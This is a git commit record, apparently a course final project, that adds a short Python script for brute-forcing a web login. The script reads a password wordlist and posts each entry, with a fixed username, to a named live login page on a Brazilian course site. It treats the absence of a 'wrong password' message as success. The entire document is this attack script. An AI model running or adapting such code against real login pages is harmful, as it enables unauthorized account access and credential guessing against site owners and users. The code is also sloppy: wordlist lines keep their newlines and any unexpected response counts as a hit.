2313cc80c8b939425b7ec724ade8ca0390a03a92
Thiago Santos <thiagoboy34@gmail.com>
2021-05-04 00:54:09 -0300

    Project Final

---
+++ http_login_bruteforce.py
@@ -0,0 +1,17 @@
+import requests
+
+url = 'http://ensino.solyd.com.br/login/index.php'
+
+arquivo = open('wordlist.txt')
+linhas = arquivo.readlines()
+
+for linha in linhas:
+    dados = {'username': 'auba@example.com',
+             'password': linha}
+
+    resposta = requests.post(url, data=dados)
+
+    if "senha errados" in resposta.text:
+        print("Senha incorreta:", linha)
+    else:
+        print("Senha correta:", linha)
